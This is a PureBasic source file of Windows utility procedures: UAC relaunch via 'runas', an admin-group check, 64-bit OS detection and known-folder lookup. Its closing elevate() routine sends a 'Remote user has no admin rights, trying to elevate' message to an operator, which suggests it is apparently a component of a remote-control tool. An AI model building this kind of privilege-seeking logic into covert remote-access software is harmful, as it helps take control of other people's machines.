;Important! Under "runas" you are a different user,
;so if you wish to run a program after you have installed it,
;then make sure you do so from the exe that did the "runas",
;rather than the elvated one as that is most likely a admin user different from the current user.
;Use the optional params$ to pass along startup params and other info you want to pass along.
Procedure.i RelaunchAndElevate(params$="")
   Protected info.SHELLEXECUTEINFO,exe$
   exe$=ProgramFilename()
   If exe$
      info\hwnd            = GetForegroundWindow_()
      info\cbSize          = SizeOf(SHELLEXECUTEINFO)
      info\lpVerb          = @"runas"
      info\lpFile          = @exe$
      info\lpParameters    = @params$
      info\nShow           = #SW_SHOWNORMAL
      ProcedureReturn ShellExecuteEx_(info)
 EndIf
EndProcedure

Procedure.s GetUserName()
 Protected result$,size.i=#UNLEN
 result$=Space(size)
 If Not GetUserName_(@result$,@size)
  result$=""
 EndIf
 ProcedureReturn result$
EndProcedure

CompilerIf #PB_Compiler_Processor=#PB_Processor_x64
   Macro Is64BitOS() ;Well duh! What ya expect, only a 64bit OS can run a 64bit app! P
    #True
 EndMacro
CompilerElse ;Return #False if 32bit OS or if unable to determine if it's a 64bit OS!
   #PROCESSOR_ARCHITECTURE_AMD64=9
   Prototype.l IsWow64Process_(hProcess.i,*Wow64Process)
   Prototype.i GetNativeSystemInfo_(*si.SYSTEM_INFO)
   Procedure.i Is64BitOS()
    Protected result.i=#False,dll.i,si.SYSTEM_INFO,iswow64.l=#False
      Protected GetNativeSystemInfo_.GetNativeSystemInfo_,IsWow64Process_.IsWow64Process_
      dll=OpenLibrary(#PB_Any,"kernel32.dll")
    If dll
         IsWow64Process_=GetFunction(dll,"IsWow64Process") ;Only XP SP2+ and 2003 SP1+ has this function.
         If IsWow64Process_(GetCurrentProcess_(),@iswow64)
          result=iswow64
         EndIf
         If Not IsWow64Process_
            GetNativeSystemInfo_=GetFunction(dll,"GetNativeSystemInfo") ;Only XP+ has this function.
            GetNativeSystemInfo_(si)
          If si\wProcessorArchitecture=#PROCESSOR_ARCHITECTURE_AMD64
             result=#True
            EndIf
         EndIf
     CloseLibrary(dll)
    EndIf
    ProcedureReturn result
   EndProcedure
CompilerEndIf ;Return #True if it's a 64bit OS!

Prototype.l CheckTokenMembership_(TokenHandle.i,SidToCheck.i,*IsMember)
Prototype.l AllocateAndInitializeSid_(*pIdentifierAuthority,nSubAuthorityCount.b,dwSubAuthority0.l,dwSubAuthority1.l,dwSubAuthority2.l,dwSubAuthority3.l,dwSubAuthority4.l,dwSubAuthority5.l,dwSubAuthority6.l,dwSubAuthority7.l,*pSid)
Prototype.i FreeSid_(*pSid)

;Returns #True if this program/process is a member of the Administrators local group, or #False otherwise or if failure.
;Works on Windows 5.x (2000, XP, 2003, etc.) and 6.x (vista, 2008, Win7, etc.)
Procedure.i IsUserAdmin()
   Protected result.i=#True,dll.i
   Protected CheckTokenMembership_.CheckTokenMembership_,AllocateAndInitializeSid_.AllocateAndInitializeSid_,FreeSid_.FreeSid_
   Protected *AdministratorsGroup.SID_IDENTIFIER_AUTHORITY,NtAuthority.SID_IDENTIFIER_AUTHORITY

   dll=OpenLibrary(#PB_Any,"advapi32.dll")
   If dll
      CheckTokenMembership_=GetFunction(dll,"CheckTokenMembership")
      AllocateAndInitializeSid_=GetFunction(dll,"AllocateAndInitializeSid")
      FreeSid_=GetFunction(dll,"FreeSid")
      If Not (CheckTokenMembership_ Or AllocateAndInitializeSid_ Or FreeSid_)
         result=#False
      EndIf
      If result
         ;NtAuthority=SECURITY_NT_AUTHORITY [0,0,0,0,0,5]
         NtAuthority\Value[0]=0
         NtAuthority\Value[1]=0
         NtAuthority\Value[2]=0
         NtAuthority\Value[3]=0
         NtAuthority\Value[4]=0
         NtAuthority\Value[5]=5
         result=AllocateAndInitializeSid_(NtAuthority,2,#SECURITY_BUILTIN_DOMAIN_RID,#DOMAIN_ALIAS_RID_ADMINS,0,0,0,0,0,0,@*AdministratorsGroup)
         If result And *AdministratorsGroup
            If Not CheckTokenMembership_(#Null,*AdministratorsGroup,@result)
               result=#False
            EndIf
            FreeSid_(*AdministratorsGroup)
         EndIf
      EndIf
      CloseLibrary(dll)
   Else
    result=#False
   EndIf
   ProcedureReturn result
EndProcedure

#KF_FLAG_CREATE=$00008000
Prototype.i SHGetKnownFolderPath_(*rfid,dwFlags.l,hToken.i,*ppszPath)
Prototype.i SHGetFolderPath_(hwndOwner.i,nFolder.l,hToken.i,dwFlags.l,*pszPath)

;GetKnownFolderPath() will return either the current user paths or the "all users" path,
;only the most typicial folders and which are consistent in behaviour on Windows 5.x and 6.x are available.

;GetKnownFolderPath() flags, use the set the "all" argument to #True to get "all users" paths.
;For #Folder_Programs and #Folder_Appdata it is highly advised that you add a company/brand/entity sub folder,
;and within that program/app folder where you put the program files/shortcuts etc.
Enumeration 1
 #Folder_Startmenu ;The startmenu/programs path (for start menu programs icons).
 #Folder_Desktop  ;The desktop path (for desktop icons).
 #Folder_Programs  ;The advised install location for applications/programs.
 #Folder_Settings  ;The advised location for application settings/configs.
 #Folder_Documents ;Documents folder location.
EndEnumeration

;Returns #True if this program/process is a member of the Administrators local group, or #False otherwise or if failure.
Procedure.s GetKnownFolderPath(folder.i,all.i=#False) ;Windows 2000 (5.0) or later.
   Protected folder$,result.i=#True,dll.i,rfid.GUID,*path,path$,csidl.l
   Protected SHGetKnownFolderPath_.SHGetKnownFolderPath_,SHGetFolderPath_.SHGetFolderPath_

   dll=OpenLibrary(#PB_Any,"shell32.dll")
   If dll
      SHGetKnownFolderPath_=GetFunction(dll,"SHGetKnownFolderPath")
      If Not SHGetKnownFolderPath_
         result=#False
      EndIf
      If result ;Windows 6.x
       Select folder
          Case #Folder_Startmenu
           If all ;FOLDERID_CommonPrograms CSIDL_COMMON_PROGRAMS {0139D44E-6AFE-49F2-8690-3DAFCAE6FFB8}
              rfid\Data1=$0139D44E
              rfid\Data2=$6AFE
              rfid\Data3=$49F2
              rfid\Data4[0]=$86
              rfid\Data4[1]=$90
              rfid\Data4[2]=$3D
              rfid\Data4[3]=$AF
              rfid\Data4[4]=$CA
              rfid\Data4[5]=$E6
              rfid\Data4[6]=$FF
              rfid\Data4[7]=$B8
           Else ;FOLDERID_Programs CSIDL_PROGRAMS {A77F5D77-2E2B-44C3-A6A2-ABA601054A51}
              rfid\Data1=$A77F5D77
              rfid\Data2=$2E2B
              rfid\Data3=$44C3
              rfid\Data4[0]=$A6
              rfid\Data4[1]=$A2
              rfid\Data4[2]=$AB
              rfid\Data4[3]=$A6
              rfid\Data4[4]=$01
              rfid\Data4[5]=$05
              rfid\Data4[6]=$4A
              rfid\Data4[7]=$51
           EndIf
          Case #Folder_Desktop
           If all ;FOLDERID_PublicDesktop CSIDL_COMMON_DESKTOPDIRECTORY {C4AA340D-F20F-4863-AFEF-F87EF2E6BA25}
              rfid\Data1=$C4AA340D
              rfid\Data2=$F20F
              rfid\Data3=$4863
              rfid\Data4[0]=$AF
              rfid\Data4[1]=$EF
              rfid\Data4[2]=$F8
              rfid\Data4[3]=$7E
              rfid\Data4[4]=$F2
              rfid\Data4[5]=$E6
              rfid\Data4[6]=$BA
              rfid\Data4[7]=$25
           Else ;FOLDERID_Desktop CSIDL_DESKTOP {B4BFCC3A-DB2C-424C-B029-7FE99A87C641}
              rfid\Data1=$B4BFCC3A
              rfid\Data2=$DB2C
              rfid\Data3=$424C
              rfid\Data4[0]=$B0
              rfid\Data4[1]=$29
              rfid\Data4[2]=$7F
              rfid\Data4[3]=$E9
              rfid\Data4[4]=$9A
              rfid\Data4[5]=$87
              rfid\Data4[6]=$C6
              rfid\Data4[7]=$41
           EndIf
          Case #Folder_Programs
           If all ;FOLDERID_ProgramFiles CSIDL_PROGRAM_FILES {905e63b6-c1bf-494e-b29c-65b732d3d21a}
              rfid\Data1=$905E63B6
              rfid\Data2=$C1BF
              rfid\Data3=$494E
              rfid\Data4[0]=$B2
              rfid\Data4[1]=$9C
              rfid\Data4[2]=$65
              rfid\Data4[3]=$B7
              rfid\Data4[4]=$32
              rfid\Data4[5]=$D3
              rfid\Data4[6]=$D2
              rfid\Data4[7]=$1A
           Else ;FOLDERID_LocalAppData CSIDL_LOCAL_APPDATA {F1B32785-6FBA-4FCF-9D55-7B8E7F157091}
              rfid\Data1=$F1B32785
              rfid\Data2=$6FBA
              rfid\Data3=$4FCF
              rfid\Data4[0]=$9D
              rfid\Data4[1]=$55
              rfid\Data4[2]=$7B
              rfid\Data4[3]=$8E
              rfid\Data4[4]=$7F
              rfid\Data4[5]=$15
              rfid\Data4[6]=$70
              rfid\Data4[7]=$91
           EndIf
          Case #Folder_Settings
           If all ;FOLDERID_ProgramData CSIDL_COMMON_APPDATA    {62AB5D82-FDC1-4DC3-A9DD-070D1D495D97}
              rfid\Data1=$62AB5D82
              rfid\Data2=$FDC1
              rfid\Data3=$4DC3
              rfid\Data4[0]=$A9
              rfid\Data4[1]=$DD
              rfid\Data4[2]=$07
              rfid\Data4[3]=$0D
              rfid\Data4[4]=$1D
              rfid\Data4[5]=$49
              rfid\Data4[6]=$5D
              rfid\Data4[7]=$97
           Else ;FOLDERID_RoamingAppData CSIDL_APPDATA {3EB685DB-65F9-4CF6-A03A-E3EF65729F3D}
              rfid\Data1=$3EB685DB
              rfid\Data2=$65F9
              rfid\Data3=$4CF6
              rfid\Data4[0]=$A0
              rfid\Data4[1]=$3A
              rfid\Data4[2]=$E3
              rfid\Data4[3]=$EF
              rfid\Data4[4]=$65
              rfid\Data4[5]=$72
              rfid\Data4[6]=$9F
              rfid\Data4[7]=$3D
           EndIf
          Case #Folder_Documents
           If all  ;FOLDERID_PublicDocuments CSIDL_COMMON_DOCUMENTS {ED4824AF-DCE4-45A8-81E2-FC7965083634}
              rfid\Data1=$ED4824AF
              rfid\Data2=$DCE4
              rfid\Data3=$45A8
              rfid\Data4[0]=$81
              rfid\Data4[1]=$E2
              rfid\Data4[2]=$FC
              rfid\Data4[3]=$79
              rfid\Data4[4]=$65
              rfid\Data4[5]=$08
              rfid\Data4[6]=$36
              rfid\Data4[7]=$34
           Else ;FOLDERID_Documents #CSIDL_PERSONAL {FDD39AD0-238F-46AF-ADB4-6C85480369C7}
              rfid\Data1=$FDD39AD0
              rfid\Data2=$238F
              rfid\Data3=$46AF
              rfid\Data4[0]=$AD
              rfid\Data4[1]=$B4
              rfid\Data4[2]=$6C
              rfid\Data4[3]=$85
              rfid\Data4[4]=$48
              rfid\Data4[5]=$03
              rfid\Data4[6]=$69
              rfid\Data4[7]=$C7
           EndIf
          Default
           result=#False
       EndSelect
       If result
          result=SHGetKnownFolderPath_(rfid,#KF_FLAG_CREATE,#Null,@*path)
          If (result=#S_OK) And *path
           folder$=PeekS(*path)
          EndIf
          If *path
           CoTaskMemFree_(*path)
          EndIf
       EndIf
      Else ;Legacy (Windows 5.x)
         SHGetFolderPath_=GetFunction(dll,"SHGetFolderPathW")
         If SHGetFolderPath_
            result=#True
         EndIf
         If result
          Select folder
             Case #Folder_Startmenu
              If all
               csidl=#CSIDL_COMMON_PROGRAMS
              Else
               csidl=#CSIDL_PROGRAMS
              EndIf
             Case #Folder_Desktop
              If all
               csidl=#CSIDL_COMMON_DESKTOPDIRECTORY
              Else
                 csidl=#CSIDL_DESKTOP
              EndIf
             Case #Folder_Programs
              If all
               csidl=#CSIDL_PROGRAM_FILES
              Else
                 csidl=#CSIDL_LOCAL_APPDATA 
              EndIf
             Case #Folder_Settings
              If all
               csidl=#CSIDL_COMMON_APPDATA
              Else
                 csidl=#CSIDL_APPDATA
              EndIf
             Case #Folder_Documents
              If all
                 csidl=#CSIDL_COMMON_DOCUMENTS
              Else
               csidl=#CSIDL_PERSONAL
              EndIf
             Default
              result=#False
          EndSelect
          If result
           path$=Space(#MAX_PATH)
     If SHGetFolderPath_(#Null,csidl,#Null,#SHGFP_TYPE_CURRENT,@path$)=#S_OK
              folder$=Trim(path$)
               EndIf
          EndIf
         EndIf
      EndIf
    If Len(folder$)
       If Not (Right(folder$,1)="\")
        folder$+"\"
       EndIf
    EndIf
      CloseLibrary(dll)
   EndIf
   ProcedureReturn folder$
EndProcedure

;Example
Global elevated = -1


Procedure elevate()
If Not IsUserAdmin()
	send_fdb("<span style='color:orange'><b>Remote user has no admin rights, trying to elevate...</b></span>")
 If RelaunchAndElevate()
  End
 Else
 	;send_fdb("<span style='color:red'>We are not elevated...</span>")
 	elevated = 0
 EndIf
Else
	;send_fdb("<span style='color:green'><b>We are elevated!</b></span>")
	elevated = 1
EndIf
EndProcedure
; IDE Options = PureBasic 5.00 (Windows - x86)
; EnableUnicode
; Executable = ..\..\Users\admin\Desktop\hamko5.exe
; DisableDebugger
; EnablePurifier
; EnableCompileCount = 307
; EnableBuildCount = 18